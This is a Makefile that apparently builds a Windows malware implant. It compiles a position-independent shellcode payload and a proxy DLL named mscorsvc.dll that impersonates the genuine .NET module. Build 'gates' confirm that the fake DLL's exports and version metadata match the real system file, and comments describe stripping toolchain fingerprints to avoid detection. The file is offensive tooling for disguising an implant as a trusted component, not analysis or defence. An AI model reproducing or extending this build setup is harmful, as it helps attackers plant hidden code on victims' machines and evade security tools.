NASM    := nasm
CC      := x86_64-w64-mingw32-gcc
HOSTCC  ?= cc
PY      := python3
OBJCOPY := x86_64-w64-mingw32-objcopy
OBJDUMP := x86_64-w64-mingw32-objdump
WINDRES := x86_64-w64-mingw32-windres

BUILD   := build
OBJ     := $(BUILD)/obj
MAP     := $(BUILD)/map
INSP    := $(BUILD)/inspect
GEN     := $(BUILD)/gen
BIN     := bin

# Freestanding, size-optimised, no CRT, no unwind metadata, no cookie.
CFLAGS  := -Os -Wall -Wextra -Werror -Iinclude -I$(GEN) \
           -ffreestanding -fno-asynchronous-unwind-tables \
           -fno-stack-protector -fno-ident -fomit-frame-pointer
LDFLAGS := -nostdlib -Wl,--entry,bx_entry -Wl,--disable-dynamicbase \
           -Wl,--disable-high-entropy-va -Wl,--no-insert-timestamp \
           -Wl,-T,linker/bellatrix.ld

PAYLOAD := $(BIN)/payload.bin
IMAGE   := $(BUILD)/payload.exe
DLL     := $(BIN)/mscorsvc.dll
PARAMS  := $(GEN)/hash_params.h
PSTAMP  := $(GEN)/.params
# Reference copy of the module being impersonated; the metadata gates diff
# against it. Probed in both spellings: the mingw toolchain under WSL wants
# /mnt/c, native Windows wants C:/. Override with REAL_MSC=... if it lives
# elsewhere.
REAL_MSC ?= $(firstword $(wildcard \
	/mnt/c/Windows/Microsoft.NET/Framework64/v4.0.30319/mscorsvc.dll \
	C:/Windows/Microsoft.NET/Framework64/v4.0.30319/mscorsvc.dll))

.PHONY: all clean inspect test check-bind

all: $(PAYLOAD) $(DLL) inspect

$(BUILD) $(OBJ) $(MAP) $(INSP) $(GEN) $(BIN):
	mkdir -p $@

# ---- per-build hash parameters ------------------------------------
$(PSTAMP): tools/genparams.py | $(GEN)
	$(PY) tools/genparams.py init --outdir $(GEN)
	@touch $@

$(PARAMS): $(PSTAMP)

# ---- COFF objects --------------------------------------------------
$(OBJ)/entry_x64.o: asm/entry_x64.asm $(PSTAMP) | $(OBJ)
	$(NASM) -f win64 -o $@ asm/entry_x64.asm

$(OBJ)/entry.o: src/entry.c include/resolve.h $(PARAMS) | $(OBJ)
	$(CC) $(CFLAGS) -c -o $@ src/entry.c

$(OBJ)/resolve.o: src/resolve.c include/resolve.h include/runtime.h $(PARAMS) | $(OBJ)
	$(CC) $(CFLAGS) -c -o $@ src/resolve.c

$(OBJ)/runtime.o: src/runtime.c include/runtime.h | $(OBJ)
	$(CC) $(CFLAGS) -c -o $@ src/runtime.c

$(OBJ)/payload.o: src/payload.c include/implant.h include/resolve.h $(PARAMS) | $(OBJ)
	$(CC) $(CFLAGS) -c -o $@ src/payload.c

$(OBJ)/proxy.o: src/proxy.c include/proxy.h include/implant.h include/resolve.h $(PARAMS) | $(OBJ)
	$(CC) $(CFLAGS) -c -o $@ src/proxy.c

$(OBJ)/proxy_x64.o: asm/proxy_x64.asm include/proxy.h | $(OBJ)
	$(NASM) -f win64 -o $@ asm/proxy_x64.asm

$(OBJ)/proxy_res.o: src/mscorsvc.rc | $(OBJ)
	$(WINDRES) -i $< -o $@

# ---- carrier proxy DLL ---------------------------------------------
# No forwarder entries: the exports are real trampolines, so the EAT is an
# ordinary list of addresses just like the module being impersonated.
#
# -nostdlib keeps mingw's CRT out of the import table. The real mscorsvc.dll
# links the CLR CRTs; ours linking msvcrt.dll would be a toolchain fingerprint
# that has nothing to do with the module being impersonated. The system
# libraries are named explicitly because -nostdlib drops them too.
$(DLL): $(OBJ)/proxy_x64.o $(OBJ)/proxy.o $(OBJ)/payload.o $(OBJ)/resolve.o \
		$(OBJ)/runtime.o $(OBJ)/proxy_res.o src/mscorsvc.def | $(BIN)
	$(CC) -shared -nostdlib -o $@ $(OBJ)/proxy_x64.o $(OBJ)/proxy.o $(OBJ)/payload.o \
	    $(OBJ)/resolve.o $(OBJ)/runtime.o $(OBJ)/proxy_res.o src/mscorsvc.def \
	    -lkernel32 -lshell32 -ladvapi32

# ---- linked intermediate image ------------------------------------
# entry_x64.o first: the blob starts at the entry stub.
$(IMAGE): $(OBJ)/entry_x64.o $(OBJ)/entry.o $(OBJ)/resolve.o $(OBJ)/runtime.o $(OBJ)/payload.o | $(BUILD) $(MAP)
	$(CC) $(LDFLAGS) -o $@ $(OBJ)/entry_x64.o $(OBJ)/entry.o $(OBJ)/resolve.o \
	    $(OBJ)/runtime.o $(OBJ)/payload.o
	$(OBJDUMP) -h $@ > $(MAP)/sections.txt

# ---- flattened blob ------------------------------------------------
$(PAYLOAD): $(IMAGE) | $(BIN)
	$(OBJCOPY) -O binary --only-section=.text $< $@
	@echo "payload: $$(wc -c < $@) bytes"

# ---- inspection ----------------------------------------------------
inspect: $(PAYLOAD) $(IMAGE) | $(INSP)
	@echo "== image sections =="
	cat $(MAP)/sections.txt
	@echo "== blob disassembly =="
	$(OBJDUMP) -D -b binary -m i386:x86-64 -M intel $(PAYLOAD) > $(INSP)/payload.asm
	grep -c '' $(INSP)/payload.asm
	@echo "== gate: no absolute image VAs in the blob =="
	@sz_hex=$$($(OBJDUMP) -h $(IMAGE) | awk '$$2==".text" {print $$3}'); \
	vma_hex=$$($(OBJDUMP) -h $(IMAGE) | awk '$$2==".text" {print $$4}'); \
	sz=$$((0x$$sz_hex)); \
	vma=$$((0x$$vma_hex)); \
	bad=0; \
	for v in $$(grep -oE '0x[0-9a-f]{6,12}' $(INSP)/payload.asm | sort -u); do \
	    n=$$((v)); \
	    if [ $$n -ge $$vma ] && [ $$n -lt $$((vma + sz)) ]; then \
	        echo "  FAIL: $$v points inside the image"; bad=1; \
	    fi; \
	done; \
	[ $$bad -eq 0 ] && echo "  ok: every immediate is data, not an address"
	@echo "== gate: entry is the first byte of .text =="
	@vma=$$($(OBJDUMP) -h $(IMAGE) | awk '$$2==".text" {print "0x"$$4}'); \
	ent=$$($(OBJDUMP) -p $(IMAGE) | awk '/AddressOfEntryPoint/ {print "0x"$$2}'); \
	base=$$($(OBJDUMP) -p $(IMAGE) | awk '/ImageBase/ {print "0x"$$2}'); \
	if [ $$((ent + base)) -eq $$((vma)) ]; then \
	    echo "  ok: entry == .text start (0x$$(printf %x $$vma))"; \
	else \
	    echo "FAIL: entry 0x$$(printf %x $$((ent+base))) != .text 0x$$(printf %x $$vma)"; \
	    exit 1; \
	fi
	@echo "== gate: proxy EAT matches the module it impersonates =="
	@$(OBJDUMP) -p $(REAL_MSC) 2>/dev/null | \
	    awk '/\+base\[/ && $$NF != "RVA" {print $$NF}' | sort > $(INSP)/eat_real.txt
	@$(OBJDUMP) -p $(DLL) | \
	    awk '/\+base\[/ && $$NF != "RVA" {print $$NF}' | sort > $(INSP)/eat_proxy.txt
	@diff $(INSP)/eat_real.txt $(INSP)/eat_proxy.txt >/dev/null && \
	    echo "  ok: $$(wc -l < $(INSP)/eat_proxy.txt) exports identical" || \
	    { echo "FAIL: export surface diverges"; \
	      diff $(INSP)/eat_real.txt $(INSP)/eat_proxy.txt; exit 1; }
	@echo "== gate: no forwarder entries in the proxy EAT =="
	@$(OBJDUMP) -p $(DLL) | \
	    sed -n '/\[Ordinal\/Name Pointer\] Table/,/^$$/p' | \
	    grep -E '\.' && { echo "FAIL: forwarder entry present"; exit 1; } || \
	    echo "  ok: every export is a real trampoline"
	@echo "== gate: proxy version metadata matches the impersonated module =="
	@$(PY) tools/check_version.py "$(REAL_MSC)" $(DLL) >/dev/null && \
	    echo "  ok: OriginalFilename and version fields match" || \
	    { echo "FAIL: version metadata diverges"; \
	      $(PY) tools/check_version.py "$(REAL_MSC)" $(DLL); exit 1; }
	@echo "== gate: no data sections in the extracted range =="
	@for s in .rdata .data .bss; do \
	    sz=$$($(OBJDUMP) -h $(IMAGE) | awk -v s="$$s" '$$2==s {print "0x"$$3}'); \
	    if [ -n "$$sz" ] && [ $$(($$sz)) -gt 0 ]; then \
	        echo "FAIL: $$s is non-empty ($$sz bytes) and would be dropped by extraction"; \
	        echo "      shellcode discipline: constants are immediates, no static data"; \
	        exit 1; \
	    fi; \
	done; echo "  ok: everything the blob needs is inside .text"

# ---- tests --------------------------------------------------------
$(BUILD)/test_runtime: tools/test_runtime.c src/runtime.c include/runtime.h | $(BUILD)
	$(HOSTCC) -O2 -Wall -Wextra -Werror -Iinclude -o $@ tools/test_runtime.c src/runtime.c

$(BUILD)/test_resolve.exe: tools/test_resolve.c src/resolve.c src/runtime.c \
		include/resolve.h include/runtime.h $(PARAMS) | $(BUILD)
	$(CC) -O2 -Wall -Wextra -Werror -Iinclude -I$(GEN) -o $@ \
	    tools/test_resolve.c src/resolve.c src/runtime.c

test: $(BUILD)/test_runtime $(BUILD)/test_resolve.exe
	@echo "== runtime primitives =="
	@$(BUILD)/test_runtime
	@echo "== resolver against the real loader =="
	@$(BUILD)/test_resolve.exe

# The forwarding side: exercises the real bind_real and confirms all seven
# trampoline destinations resolve. This is the test the path bug slipped past.
$(BUILD)/test_bind.exe: tools/test_bind.c src/proxy.c src/resolve.c src/runtime.c \
		src/payload.c include/proxy.h include/implant.h include/resolve.h \
		include/runtime.h $(PARAMS) | $(BUILD)
	$(CC) -O2 -Wall -Wextra -Iinclude -I$(GEN) -o $@ \
	    tools/test_bind.c src/resolve.c src/runtime.c src/payload.c -lkernel32 -ladvapi32

check-bind: $(BUILD)/test_bind.exe
	@echo "== forwarding targets =="
	@$(BUILD)/test_bind.exe

clean:
	rm -rf $(BUILD) $(BIN)
